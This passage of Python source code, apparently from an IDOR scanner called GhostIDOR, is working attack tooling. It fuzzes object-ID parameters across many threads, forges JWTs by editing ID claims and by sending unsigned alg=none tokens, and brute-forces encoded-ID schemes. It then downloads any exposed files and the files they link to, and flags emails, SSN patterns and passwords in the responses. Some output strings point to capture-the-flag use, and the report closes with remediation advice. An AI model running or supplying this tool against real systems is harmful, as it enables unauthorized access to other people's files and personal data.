        return hashlib.md5(content.encode()).hexdigest()
    
    def _generate_curl_command(self, url: str, method: str, headers: Dict, data: Any = None) -> str:
        """Generate curl command for reproduction"""
        cmd_parts = ["curl", "-X", method]
        
        # Add headers
        for key, value in headers.items():
            if key.lower() not in ['content-length', 'host']:
                cmd_parts.extend(["-H", f"'{key}: {value}'"])
        
        # Add data
        if data:
            if isinstance(data, dict):
                data_str = urlencode(data)
                cmd_parts.extend(["-d", f"'{data_str}'"])
            else:
                cmd_parts.extend(["-d", f"'{data}'"])
        
        # Add URL
        cmd_parts.append(f"'{url}'")
        
        return " ".join(cmd_parts)
    
    def _capture_request_response(self, response: requests.Response, method: str, data: Any = None) -> Dict:
        """Capture full request and response details"""
        return {
            'request_headers': dict(response.request.headers),
            'request_body': data if data else response.request.body,
            'response_headers': dict(response.headers),
            'response_body': response.text[:5000],  # First 5000 chars
            'curl_command': self._generate_curl_command(
                response.url,
                method,
                dict(response.request.headers),
                data
            )
        }
    
    def _update_progress(self):
        """Update progress counter"""
        with self.progress_lock:
            self.tested_count += 1
            if self.tested_count % 50 == 0:
                print(f"{Colors.BLUE}[*]{Colors.RESET} Tested: {self.tested_count} | Found: {self.found_count}", end='\r')
    
    def analyze_javascript(self, url: str):
        """Analyze JavaScript sources for IDOR patterns"""
        if not self.args.analyze_js:
            return
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Analyzing JavaScript for IDOR patterns...")
        
        js_results = self.js_analyzer.fetch_and_analyze_js(url, self.session)
        
        if not js_results:
            print(f"  {Colors.YELLOW}[-] No JavaScript files found or analyzed{Colors.RESET}")
            return
        
        for i, analysis in enumerate(js_results, 1):
            if any(analysis.values()):
                print(f"\n  {Colors.CYAN}[JS File {i}]{Colors.RESET} {analysis.get('source_url', 'Unknown')}")
                
                if analysis['api_endpoints']:
                    print(f"    {Colors.GREEN}API Endpoints found:{Colors.RESET}")
                    for endpoint in analysis['api_endpoints'][:10]:
                        print(f"      • {endpoint}")
                
                if analysis['id_parameters']:
                    print(f"    {Colors.YELLOW}ID Parameters found:{Colors.RESET}")
                    for param in analysis['id_parameters'][:10]:
                        print(f"      • {param}")
                
                if analysis['encoding_functions']:
                    print(f"    {Colors.CYAN}Encoding Functions:{Colors.RESET}")
                    for func in analysis['encoding_functions']:
                        print(f"      • {func}")
                
                if analysis['suspicious_patterns']:
                    print(f"    {Colors.RED}Suspicious Patterns:{Colors.RESET}")
                    for pattern in analysis['suspicious_patterns']:
                        print(f"      • {pattern}")
        
        print(f"\n  {Colors.GREEN}[+] JavaScript analysis complete{Colors.RESET}")
    
    def _send_request(self, url: str, method: str = 'GET', data: dict = None) -> Optional[requests.Response]:
        """Send HTTP request with error handling"""
        try:
            method = method.upper()
            
            if method == 'GET':
                response = self.session.get(url, timeout=self.args.timeout, 
                                           verify=not self.args.no_verify, 
                                           allow_redirects=self.args.follow_redirects)
            elif method == 'POST':
                response = self.session.post(url, data=data, timeout=self.args.timeout,
                                            verify=not self.args.no_verify,
                                            allow_redirects=self.args.follow_redirects)
            elif method in ['PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']:
                response = self.session.request(method, url, data=data,
                                               timeout=self.args.timeout,
                                               verify=not self.args.no_verify,
                                               allow_redirects=self.args.follow_redirects)
            else:
                return None
            
            return response
        except Exception as e:
            if self.args.verbose:
                print(f"    {Colors.RED}[!] Request error:{Colors.RESET} {e}")
            return None
    
    def _analyze_idor(self, baseline_response: requests.Response, test_response: requests.Response,
                      baseline_hash: str, test_hash: str) -> bool:
        """Analyze if response indicates IDOR vulnerability"""
        
        # Different status codes often indicate IDOR
        if baseline_response.status_code != test_response.status_code:
            if test_response.status_code in [200, 201, 202]:
                return True
        
        # Same success status but different content
        if test_response.status_code in [200, 201, 202]:
            if baseline_hash != test_hash:
                len_diff = abs(len(baseline_response.text) - len(test_response.text))
                if len_diff > len(baseline_response.text) * 0.05:
                    return True
                
                baseline_ids = set(re.findall(r'\b\d{1,10}\b', baseline_response.text))
                test_ids = set(re.findall(r'\b\d{1,10}\b', test_response.text))
                
                if len(baseline_ids.symmetric_difference(test_ids)) > 3:
                    return True
        
        return False
    
    def _extract_evidence(self, response: requests.Response) -> str:
        """Extract evidence from response"""
        evidence_parts = []
        
        interesting_headers = ['X-User-Id', 'X-Account-Id', 'Set-Cookie', 'Content-Disposition']
        for header in interesting_headers:
            if header in response.headers:
                evidence_parts.append(f"{header}: {response.headers[header][:50]}")
        
        if 'Content-Disposition' in response.headers:
            evidence_parts.append("File download detected")
        
        sensitive_patterns = [
            (r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', 'Email found'),
            (r'\b\d{3}-\d{2}-\d{4}\b', 'SSN pattern'),
            (r'password["\']?\s*[:=]\s*["\']?([^"\']+)', 'Password field'),
        ]
        
        for pattern, desc in sensitive_patterns:
            if re.search(pattern, response.text):
                evidence_parts.append(desc)
        
        return " | ".join(evidence_parts) if evidence_parts else "Check response manually"
    
    def _print_vulnerability_details(self, result: IDORResult):
        """Print detailed vulnerability information including request/response"""
        print(f"\n{Colors.BOLD}{Colors.RED}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.RED}[!] IDOR VULNERABILITY DETECTED{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.RED}{'='*70}{Colors.RESET}\n")
        
        print(f"{Colors.CYAN}Technique:{Colors.RESET} {result.technique}")
        print(f"{Colors.CYAN}Confidence:{Colors.RESET} {result.confidence.upper()}")
        print(f"{Colors.CYAN}URL:{Colors.RESET} {result.url}")
        print(f"{Colors.CYAN}Method:{Colors.RESET} {result.method}")
        print(f"{Colors.CYAN}Parameter:{Colors.RESET} {result.parameter}")
        print(f"{Colors.CYAN}Tested Value:{Colors.RESET} {result.tested_value}")
        print(f"{Colors.CYAN}Status Code:{Colors.RESET} {result.status_code}")
        print(f"{Colors.CYAN}Response Length:{Colors.RESET} {result.response_length}")
        
        if result.encoding_detected:
            print(f"{Colors.CYAN}Encoding:{Colors.RESET} {result.encoding_detected}")
        
        if result.evidence:
            print(f"{Colors.CYAN}Evidence:{Colors.RESET} {result.evidence}")
        
        # Print file info if extracted
        if result.saved_file and result.file_info:
            print(f"\n{Colors.GREEN}[+] FILE EXTRACTED:{Colors.RESET}")
            print(f"  {Colors.CYAN}Filename:{Colors.RESET} {result.file_info['filename']}")
            print(f"  {Colors.CYAN}Size:{Colors.RESET} {result.file_info['size_human']}")
            print(f"  {Colors.CYAN}Type:{Colors.RESET} {result.file_info['content_type']}")
            print(f"  {Colors.CYAN}MD5:{Colors.RESET} {result.file_info['md5']}")
            print(f"  {Colors.CYAN}Path:{Colors.RESET} {result.file_info['filepath']}")
        
        # Print curl command for reproduction
        if result.curl_command:
            print(f"\n{Colors.YELLOW}[*] Reproduce with curl:{Colors.RESET}")
            print(f"{Colors.DIM}{result.curl_command}{Colors.RESET}")
        
        # Print response body preview
        if result.response_body and len(result.response_body) > 100:
            print(f"\n{Colors.YELLOW}[*] Response Preview (first 300 chars):{Colors.RESET}")
            print(f"{Colors.DIM}{result.response_body[:300]}...{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.RED}{'='*70}{Colors.RESET}\n")
    
    def _test_single_payload(self, url_template: str, param_name: str, payload: str, 
                            baseline_response: requests.Response, baseline_hash: str,
                            is_url_param: bool, data_template: Dict = None) -> Optional[IDORResult]:
        """Test a single payload (thread worker function)"""
        try:
            # Build the request
            if is_url_param:
                # URL parameter fuzzing
                test_url = url_template.replace('FUZZ', str(payload))
                response = self._send_request(test_url, self.args.method)
                test_data = None
            else:
                # POST data fuzzing
                test_data = {}
                for key, value in data_template.items():
                    if value == 'FUZZ':
                        test_data[key] = payload
                    else:
                        test_data[key] = value
                response = self._send_request(url_template, self.args.method, test_data)
            
            self._update_progress()
            
            if not response:
                return None
            
            response_hash = self._hash_response(response.text)
            
            # Check for IDOR
            is_vulnerable = self._analyze_idor(
                baseline_response, response,
                baseline_hash, response_hash
            )
            
            # Additional success indicators
            success_indicators = [
                response.status_code in [200, 201, 202],
                'Content-Disposition' in response.headers,
                len(response.content) > 100,
            ]
            
            has_content = any(success_indicators)
            
            if is_vulnerable or has_content:
                # Capture request/response
                capture = self._capture_request_response(response, self.args.method, test_data)
                
                # Try to extract file
                saved_file = None
                file_info = None
                linked_files = []
                
                if response.status_code == 200 and len(response.content) > 0:
                    try:
                        file_info = self.file_extractor.save_file(response, param_name, payload)
                        saved_file = file_info['filepath']
                    except Exception as e:
                        if self.args.verbose:
                            print(f"\n{Colors.YELLOW}[!] Could not save file: {e}{Colors.RESET}")
                    
                    # NEW: Extract links from response and download them (like bash script)
                    try:
                        base_url = test_url if is_url_param else url_template
                        links = self.file_extractor.extract_links_from_response(response.text, base_url)
                        
                        if links:
                            for link in links[:10]:  # Limit to 10 linked files per response
                                downloaded = self.file_extractor.download_file_from_url(
                                    link, self.session, param_name, payload
                                )
                                if downloaded:
                                    linked_files.append(downloaded)
                    except Exception as e:
                        if self.args.verbose:
                            print(f"\n{Colors.YELLOW}[!] Link extraction error: {e}{Colors.RESET}")
                
                result = IDORResult(
                    url=test_url if is_url_param else url_template,
                    method=self.args.method,
                    parameter=param_name,
                    original_value="N/A",
                    tested_value=str(payload),
                    status_code=response.status_code,
                    response_length=len(response.text),
                    response_hash=response_hash,
                    vulnerable=is_vulnerable or has_content,
                    evidence=self._extract_evidence(response),
                    technique="Parameter Fuzzing",
                    confidence="high" if is_vulnerable else "medium",
                    saved_file=saved_file,
                    file_info=file_info,
                    **capture
                )
                
                # Store linked files info
                if linked_files:
                    result.linked_files = linked_files
                
                with self.results_lock:
                    self.found_count += 1
                    self.results.append(result)
                
                # Print finding immediately
                print(f"\n{Colors.GREEN}[+] FOUND:{Colors.RESET} {param_name}={payload} | Status: {response.status_code} | Size: {len(response.content)} bytes")
                if saved_file:
                    print(f"    {Colors.CYAN}File saved:{Colors.RESET} {file_info['filename']}")
                
                # Print linked files
                if linked_files:
                    print(f"    {Colors.CYAN}Linked files found: {len(linked_files)}{Colors.RESET}")
                    for lf in linked_files:
                        print(f"      • {lf['filename']} ({lf['size_human']})")
                        # If it's a text file, display content (like bash script does)
                        if lf.get('is_text') and lf.get('text_content'):
                            print(f"      {Colors.YELLOW}*** FLAG/CONTENT FOUND ***{Colors.RESET}")
                            print(f"{Colors.DIM}{lf['text_content'][:500]}{Colors.RESET}")
                            if len(lf['text_content']) > 500:
                                print(f"{Colors.DIM}... (truncated, see file for full content){Colors.RESET}")
                
                if self.args.verbose:
                    self._print_vulnerability_details(result)
                
                return result
            
            # Delay if specified
            if self.args.delay > 0:
                time.sleep(self.args.delay)
            
            return None
            
        except Exception as e:
            if self.args.verbose:
                print(f"\n{Colors.RED}[!] Error testing {payload}: {e}{Colors.RESET}")
            return None
    
    def fuzz_parameter(self, url: str, param_spec: str, payloads: List[str]) -> List[IDORResult]:
        """Fuzz a specific parameter with payloads"""
        results = []
        
        # Parse parameter specification (e.g., "uid=FUZZ")
        if '=' not in param_spec:
            print(f"{Colors.RED}[!] Invalid parameter specification. Use format: param=FUZZ{Colors.RESET}")
            return results
        
        param_name, marker = param_spec.split('=', 1)
        
        if marker != 'FUZZ':
            print(f"{Colors.YELLOW}[!] Warning: Expected 'FUZZ' marker, got '{marker}'{Colors.RESET}")
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Fuzzing parameter: {Colors.CYAN}{param_name}{Colors.RESET}")
        print(f"  {Colors.CYAN}Payloads:{Colors.RESET} {len(payloads)}")
        print(f"  {Colors.CYAN}Threads:{Colors.RESET} {self.args.threads}")
        print(f"  {Colors.CYAN}Method:{Colors.RESET} {self.args.method}")
        
        # Check if it's URL parameter or POST data
        is_url_param = '?' in url and param_name in url
        
        if is_url_param:
            # URL parameter fuzzing - replace value with FUZZ
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            # Build URL template with FUZZ
            if param_name in params:
                params[param_name] = ['FUZZ']
            else:
                params[param_name] = ['FUZZ']
            
            new_query = urlencode(params, doseq=True)
            url_template = urlunparse((
                parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                parsed_url.params, new_query, parsed_url.fragment
            ))
            data_template = None
            
            print(f"  {Colors.CYAN}Target:{Colors.RESET} URL parameter")
        else:
            # POST data fuzzing
            url_template = url
            data_template = {}
            
            if self.args.data:
                for param in self.args.data.split('&'):
                    if '=' in param:
                        k, v = param.split('=', 1)
                        data_template[k] = v
            
            # Replace target parameter with FUZZ
            data_template[param_name] = 'FUZZ'
            
            print(f"  {Colors.CYAN}Target:{Colors.RESET} POST data parameter")
        
        # Get baseline response
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Establishing baseline...")
        
        if is_url_param:
            baseline_url = url_template.replace('FUZZ', '999999')
            baseline_response = self._send_request(baseline_url, self.args.method)
        else:
            baseline_data = {k: (v if v != 'FUZZ' else '999999') for k, v in data_template.items()}
            baseline_response = self._send_request(url_template, self.args.method, baseline_data)
        
        if not baseline_response:
            print(f"{Colors.RED}[!] Failed to get baseline response{Colors.RESET}")
            return results
        
        baseline_hash = self._hash_response(baseline_response.text)
        print(f"  {Colors.GREEN}Baseline established:{Colors.RESET} {baseline_response.status_code} ({len(baseline_response.content)} bytes)")
        
        # Start fuzzing
        print(f"\n{Colors.BOLD}{Colors.GHOST}[*] Starting fuzzing attack...{Colors.RESET}\n")
        
        # Multi-threaded fuzzing
        with ThreadPoolExecutor(max_workers=self.args.threads) as executor:
            futures = []
            
            for payload in payloads:
                future = executor.submit(
                    self._test_single_payload,
                    url_template,
                    param_name,
                    payload,
                    baseline_response,
                    baseline_hash,
                    is_url_param,
                    data_template
                )
                futures.append(future)
            
            # Wait for all to complete
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                except Exception as e:
                    if self.args.verbose:
                        print(f"\n{Colors.RED}[!] Thread error: {e}{Colors.RESET}")
        
        print(f"\n\n{Colors.GREEN}[+] Fuzzing complete!{Colors.RESET}")
        print(f"  {Colors.CYAN}Total tested:{Colors.RESET} {self.tested_count}")
        print(f"  {Colors.CYAN}Vulnerabilities found:{Colors.RESET} {self.found_count}")
        
        return results
    
    def test_jwt_idor(self, url: str) -> List[IDORResult]:
        """Test for JWT-based IDOR vulnerabilities"""
        results = []
        
        auth_header = self.session.headers.get('Authorization', '')
        if not auth_header.startswith('Bearer '):
            return results
        
        token = auth_header.replace('Bearer ', '')
        jwt_data = self.encoding_detector.decode_jwt(token)
        
        if not jwt_data:
            return results
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} JWT Token Detected - Testing IDOR...")
        print(f"  {Colors.CYAN}Decoded Payload:{Colors.RESET}")
        print(f"  {json.dumps(jwt_data['payload'], indent=4)}")
        
        id_claims = []
        for key in ['sub', 'user_id', 'id', 'uid', 'userId', 'account_id']:
            if key in jwt_data['payload']:
                id_claims.append((key, jwt_data['payload'][key]))
        
        if not id_claims:
            print(f"  {Colors.YELLOW}[-] No obvious ID claims found in JWT{Colors.RESET}")
            return results
        
        baseline_response = self._send_request(url, self.args.method)
        if not baseline_response:
            return results
        
        baseline_hash = self._hash_response(baseline_response.text)
        
        for claim_name, original_value in id_claims:
            print(f"\n  {Colors.CYAN}Testing claim:{Colors.RESET} {claim_name} = {original_value}")
            
            # Generate test values from wordlist if provided
            if self.args.wordlist:
                test_values = FuzzPayloadGenerator.load_wordlist(self.args.wordlist)[:20]
            else:
                test_values = FuzzPayloadGenerator.generate_smart_payloads(str(original_value))[:20]
            
            for test_value in test_values:
                modified_token = self.jwt_manipulator.modify_jwt_claim(
                    token, claim_name, test_value
                )
                
                if not modified_token:
                    continue
                
                temp_headers = self.session.headers.copy()
                temp_headers['Authorization'] = f'Bearer {modified_token}'
                
                try:
                    response = requests.request(
                        self.args.method,
                        url,
                        headers=temp_headers,
                        timeout=self.args.timeout,
                        verify=not self.args.no_verify
                    )
                    
                    response_hash = self._hash_response(response.text)
                    is_vulnerable = self._analyze_idor(
                        baseline_response, response,
                        baseline_hash, response_hash
                    )
                    
                    if is_vulnerable or response.status_code == 200:
                        capture = self._capture_request_response(response, self.args.method)
                        
                        # Try to extract file
                        saved_file = None
                        file_info = None
                        if response.status_code == 200 and len(response.content) > 0:
                            try:
                                file_info = self.file_extractor.save_file(response, claim_name, test_value)
                                saved_file = file_info['filepath']
                            except:
                                pass
                        
                        result = IDORResult(
                            url=url,
                            method=self.args.method,
                            parameter=f"JWT.{claim_name}",
                            original_value=str(original_value),
                            tested_value=str(test_value),
                            status_code=response.status_code,
                            response_length=len(response.text),
                            response_hash=response_hash,
                            vulnerable=is_vulnerable,
                            evidence=self._extract_evidence(response),
                            technique="JWT Claim Manipulation",
                            encoding_detected="jwt",
                            confidence="high" if is_vulnerable else "medium",
                            saved_file=saved_file,
                            file_info=file_info,
                            **capture
                        )
                        results.append(result)
                        
                        if is_vulnerable:
                            print(f"    {Colors.GREEN}[+] VULNERABLE:{Colors.RESET} {claim_name}={test_value}")
                            if saved_file:
                                print(f"    {Colors.CYAN}File saved:{Colors.RESET} {file_info['filename']}")
                            if self.args.verbose:
                                self._print_vulnerability_details(result)
                
                except Exception as e:
                    if self.args.verbose:
                        print(f"    {Colors.RED}[!] Error:{Colors.RESET} {e}")
                
                time.sleep(self.args.delay)
        
        # Test alg=none attack
        if self.args.advanced:
            print(f"\n  {Colors.YELLOW}[*] Testing alg=none attack...{Colors.RESET}")
            unsigned_token = self.jwt_manipulator.generate_unsigned_jwt(jwt_data['payload'])
            
            temp_headers = self.session.headers.copy()
            temp_headers['Authorization'] = f'Bearer {unsigned_token}'
            
            try:
                response = requests.request(
                    self.args.method,
                    url,
                    headers=temp_headers,
                    timeout=self.args.timeout,
                    verify=not self.args.no_verify
                )
                
                if response.status_code == 200:
                    print(f"    {Colors.RED}[!] CRITICAL:{Colors.RESET} alg=none accepted!")
                    capture = self._capture_request_response(response, self.args.method)
                    
                    # Try to extract file
                    saved_file = None
                    file_info = None
                    if len(response.content) > 0:
                        try:
                            file_info = self.file_extractor.save_file(response, "algnone", "critical")
                            saved_file = file_info['filepath']
                        except:
                            pass
                    
                    result = IDORResult(
                        url=url,
                        method=self.args.method,
                        parameter="JWT.alg",
                        original_value="signed",
                        tested_value="none",
                        status_code=response.status_code,
                        response_length=len(response.text),
                        response_hash=self._hash_response(response.text),
                        vulnerable=True,
                        evidence="Unsigned JWT accepted",
                        technique="JWT alg=none Attack",
                        confidence="critical",
                        saved_file=saved_file,
                        file_info=file_info,
                        **capture
                    )
                    results.append(result)
                    
                    if self.args.verbose:
                        self._print_vulnerability_details(result)
                        
            except Exception as e:
                if self.args.verbose:
                    print(f"    {Colors.RED}[!] Error:{Colors.RESET} {e}")
        
        return results
    
    def test_encoded_references(self, url: str) -> List[IDORResult]:
        """Test for encoded object references and attempt bypass"""
        results = []
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Testing Encoded Object References...")
        
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        post_params = {}
        if self.args.data:
            for param in self.args.data.split('&'):
                if '=' in param:
                    k, v = param.split('=', 1)
                    post_params[k] = v
        
        all_params = {**params, **post_params}
        
        for param_name, param_values in all_params.items():
            if isinstance(param_values, list):
                if not param_values:
                    continue
                original_value = param_values[0]
            else:
                original_value = param_values
            
            decoded_info = self.encoding_detector.try_decode(str(original_value))
            if decoded_info:
                print(f"\n  {Colors.GREEN}[+] Successfully decoded {param_name}:{Colors.RESET}")
                print(f"  {Colors.CYAN}Original:{Colors.RESET} {original_value}")
                print(f"  {Colors.CYAN}Decoded types:{Colors.RESET} {', '.join(decoded_info['possible_type'])}")
                for i, decoded in enumerate(decoded_info['decoded'][:3]):
                    print(f"  {Colors.CYAN}Decoded [{i+1}]:{Colors.RESET} {str(decoded)[:100]}")
            
            detected_encodings = self.encoding_detector.detect_encoding(str(original_value))
            
            if detected_encodings:
                print(f"\n  {Colors.CYAN}Detected encoding in {param_name}:{Colors.RESET} {', '.join(detected_encodings)}")
                print(f"  {Colors.CYAN}Original value:{Colors.RESET} {original_value}")
                print(f"  {Colors.YELLOW}[*] Attempting to reverse engineer encoding...{Colors.RESET}")
                
                test_values = ['1', '2', '3', '4', '5', 'admin', 'test', 'user']
                
                for test_val in test_values:
                    encoding_chain = self.encoding_detector.bruteforce_encoding_chain(
                        test_val, str(original_value)
                    )
                    
                    if encoding_chain:
                        print(f"  {Colors.GREEN}[+] ENCODING CHAIN DISCOVERED:{Colors.RESET} {' -> '.join(encoding_chain)}")
                        print(f"      Base value: {test_val}")
                        self.discovered_encoding_chains[param_name] = encoding_chain
                        
                        results.extend(self._test_with_encoding_chain(
                            url, param_name, test_val, encoding_chain, post_params
                        ))
                        break
                
                if param_name not in self.discovered_encoding_chains:
                    print(f"  {Colors.YELLOW}[-] Could not determine encoding chain automatically{Colors.RESET}")
        
        return results
    
    def _test_with_encoding_chain(self, url: str, param_name: str, base_value: str, 
                                   encoding_chain: List[str], post_params: Dict = None) -> List[IDORResult]:
        """Test IDOR using discovered encoding chain"""
        results = []
        
        print(f"\n  {Colors.BLUE}[*] Testing with encoding chain:{Colors.RESET} {' -> '.join(encoding_chain)}")
        
        test_range = range(1, 11) if not self.args.fuzz_range else range(
            *map(int, self.args.fuzz_range.split('-'))
        )
        
        baseline_response = self._send_request(url, self.args.method, post_params)
        if not baseline_response:
            return results
        
        baseline_hash = self._hash_response(baseline_response.text)
        
        for test_id in test_range:
            try:
                encoded_value = self.encoding_detector.generate_encoded_value(
                    str(test_id), encoding_chain
                )
            except Exception as e:
                if self.args.verbose:
                    print(f"    {Colors.RED}[!] Encoding error:{Colors.RESET} {e}")
                continue
            
            if post_params:
                test_data = post_params.copy()
                test_data[param_name] = encoded_value
                response = self._send_request(url, 'POST', test_data)
            else:
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                params[param_name] = [encoded_value]
                new_query = urlencode(params, doseq=True)
                new_url = urlunparse((
                    parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                    parsed_url.params, new_query, parsed_url.fragment
                ))
                response = self._send_request(new_url, 'GET')
            
            if not response:
                continue
            
            response_hash = self._hash_response(response.text)
            is_vulnerable = self._analyze_idor(
                baseline_response, response,
                baseline_hash, response_hash
            )
            
            success_indicators = [
                b'success', b'download', b'Content-Disposition',
                b'"status":"ok"', b'"error":false'
            ]
            
            has_success_indicator = any(
                indicator in response.content for indicator in success_indicators
            )
            
            if is_vulnerable or (response.status_code == 200 and has_success_indicator):
                capture = self._capture_request_response(
                    response, 
                    'POST' if post_params else 'GET',
                    test_data if post_params else None
                )
                
                # Try to extract file
                saved_file = None
                file_info = None
                if response.status_code == 200 and len(response.content) > 0:
                    try:
                        file_info = self.file_extractor.save_file(response, param_name, test_id)
                        saved_file = file_info['filepath']
                    except:
                        pass
                
                result = IDORResult(
                    url=url,
                    method='POST' if post_params else 'GET',
                    parameter=param_name,
                    original_value=base_value,
                    tested_value=encoded_value,
                    status_code=response.status_code,
                    response_length=len(response.text),
                    response_hash=response_hash,
                    vulnerable=is_vulnerable or has_success_indicator,
                    evidence=self._extract_evidence(response),
                    technique="Encoded Reference Bypass",
                    encoding_detected=' -> '.join(encoding_chain),
                    confidence="high" if is_vulnerable else "medium",
                    saved_file=saved_file,
                    file_info=file_info,
                    **capture
                )
                results.append(result)
                
                if is_vulnerable or has_success_indicator:
                    print(f"    {Colors.GREEN}[+] VULNERABLE:{Colors.RESET} ID={test_id} -> {encoded_value[:50]}...")
                    if saved_file:
                        print(f"    {Colors.CYAN}File saved:{Colors.RESET} {file_info['filename']}")
                    if self.args.verbose:
                        self._print_vulnerability_details(result)
            
            time.sleep(self.args.delay)
        
        return results
    
    def run_all_tests(self, url: str) -> List[IDORResult]:
        """Run all IDOR tests on a URL"""
        all_results = []
        
        print(f"\n{Colors.BOLD}{Colors.GHOST}[*] Target: {url}{Colors.RESET}\n")
        
        # Smart Recon Mode
        if self.args.smart_recon:
            self.smart_recon_result = SmartRecon.analyze_and_exploit(url, self.session, self.args)
            
            if self.smart_recon_result['success']:
                self.args.fuzz_param = f"{self.smart_recon_result['parameter_name']}=FUZZ"
                self.args.wordlist = self.smart_recon_result['wordlist_file']
                self.args.url = self.smart_recon_result['download_url']
                url = self.smart_recon_result['download_url']
                print(f"{Colors.GREEN}[+] Smart Recon complete - auto-fuzzing...{Colors.RESET}\n")
            else:
                print(f"{Colors.YELLOW}[!] Pattern not detected - try manual mode{Colors.RESET}\n")
        
        # Analyze JavaScript first if requested
        self.analyze_javascript(url)
        
        # If parameter fuzzing specified, do that
        if self.args.fuzz_param:
            # Load payloads
            if self.args.wordlist:
                print(f"{Colors.BLUE}[*]{Colors.RESET} Loading wordlist: {self.args.wordlist}")
                payloads = FuzzPayloadGenerator.load_wordlist(self.args.wordlist)
                if not payloads:
                    print(f"{Colors.YELLOW}[!] Failed to load wordlist, using defaults{Colors.RESET}")
                    payloads = FuzzPayloadGenerator.generate_default_payloads(100)
            else:
                payloads = FuzzPayloadGenerator.generate_default_payloads(self.args.fuzz_count)
            
            print(f"{Colors.GREEN}[+]{Colors.RESET} Loaded {len(payloads)} payloads")
            
            all_results.extend(self.fuzz_parameter(url, self.args.fuzz_param, payloads))
        
        # Test for JWT IDOR if auth header present
        if 'Authorization' in self.session.headers and not self.args.fuzz_param:
            jwt_results = self.test_jwt_idor(url)
            all_results.extend(jwt_results)
        
        # Test for encoded references
        if (self.args.detect_encoding or self.args.method == 'POST') and not self.args.fuzz_param:
            all_results.extend(self.test_encoded_references(url))
        
        return all_results
    
    def print_report(self, results: List[IDORResult]):
        """Print final report"""
        vulnerable_results = [r for r in results if r.vulnerable]
        critical_results = [r for r in vulnerable_results if r.confidence == "critical"]
        high_results = [r for r in vulnerable_results if r.confidence == "high"]
        
        print(f"\n{Colors.BOLD}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GHOST}                    GHOSTIDOR SCAN REPORT{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*70}{Colors.RESET}\n")
        
        print(f"{Colors.CYAN}Total Tests:{Colors.RESET} {len(results)}")
        print(f"{Colors.RED}Critical Findings:{Colors.RESET} {len(critical_results)}")
        print(f"{Colors.GREEN}High Confidence:{Colors.RESET} {len(high_results)}")
        print(f"{Colors.YELLOW}Medium Confidence:{Colors.RESET} {len(vulnerable_results) - len(high_results) - len(critical_results)}")
        
        # Count files extracted
        files_extracted = sum(1 for r in vulnerable_results if r.saved_file)
        linked_files_count = sum(len(r.linked_files) if r.linked_files else 0 for r in vulnerable_results)
        total_files = files_extracted + linked_files_count
        
        if total_files > 0:
            print(f"{Colors.CYAN}Direct Files Extracted:{Colors.RESET} {files_extracted}")
            print(f"{Colors.CYAN}Linked Files Downloaded:{Colors.RESET} {linked_files_count}")
            print(f"{Colors.CYAN}Total Files:{Colors.RESET} {total_files}")
            print(f"{Colors.CYAN}Output Directory:{Colors.RESET} {self.file_extractor.output_dir}")
        
        if vulnerable_results:
            print(f"\n{Colors.BOLD}{Colors.RED}[!] IDOR VULNERABILITIES DETECTED:{Colors.RESET}\n")
            
            for i, result in enumerate(vulnerable_results, 1):
                if result.confidence == "critical":
                    conf_color = Colors.RED
                elif result.confidence == "high":
                    conf_color = Colors.GREEN
                else:
                    conf_color = Colors.YELLOW
                
                print(f"{Colors.BOLD}[{i}] {result.technique} {conf_color}[{result.confidence.upper()}]{Colors.RESET}")
                if result.encoding_detected:
                    print(f"    Encoding: {Colors.CYAN}{result.encoding_detected}{Colors.RESET}")
                print(f"    URL: {result.url}")
                print(f"    Method: {result.method}")
                print(f"    Parameter: {Colors.CYAN}{result.parameter}{Colors.RESET}")
                print(f"    Tested: {Colors.GREEN}{result.tested_value[:80]}{Colors.RESET}")
                print(f"    Status: {result.status_code} | Length: {result.response_length}")
                if result.evidence:
                    print(f"    Evidence: {result.evidence}")
                
                # Show file info if extracted
                if result.saved_file and result.file_info:
                    print(f"    {Colors.GREEN}File: {result.file_info['filename']} ({result.file_info['size_human']}){Colors.RESET}")
                
                # Show linked files
                if result.linked_files:
                    print(f"    {Colors.CYAN}Linked files: {len(result.linked_files)}{Colors.RESET}")
                    for lf in result.linked_files[:5]:  # Show first 5
                        flag_indicator = " [FLAG]" if lf.get('is_text') else ""
                        print(f"      • {lf['filename']} ({lf['size_human']}){Colors.YELLOW}{flag_indicator}{Colors.RESET}")
                
                # Show curl command
                if result.curl_command:
                    print(f"    {Colors.YELLOW}Curl:{Colors.RESET} {result.curl_command[:100]}...")
                
                print()
        else:
            print(f"\n{Colors.GREEN}[+] No IDOR vulnerabilities detected{Colors.RESET}")
        
        if vulnerable_results:
            print(f"\n{Colors.BOLD}{Colors.YELLOW}[*] REMEDIATION RECOMMENDATIONS:{Colors.RESET}")
            print(f"  1. Implement proper authorization checks on server-side")
            print(f"  2. Use random, unpredictable identifiers (UUIDs)")
            print(f"  3. Validate user ownership before returning resources")
            print(f"  4. Implement rate limiting and monitoring")
            print(f"  5. Never rely on client-side access control")
            if any(r.encoding_detected == 'jwt' for r in vulnerable_results):
                print(f"  6. {Colors.RED}[JWT] Properly verify signature and claims{Colors.RESET}")
                print(f"  7. {Colors.RED}[JWT] Reject alg=none tokens{Colors.RESET}")
        
        if self.args.output:
            self._save_report(results, vulnerable_results)
    
    def _save_report(self, all_results: List[IDORResult], vulnerable_results: List[IDORResult]):
        """Save report to file"""
        linked_files_count = sum(len(r.linked_files) if r.linked_files else 0 for r in vulnerable_results)
        
        output_data = {
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'target': self.args.url,
            'total_tests': len(all_results),
            'vulnerabilities_found': len(vulnerable_results),
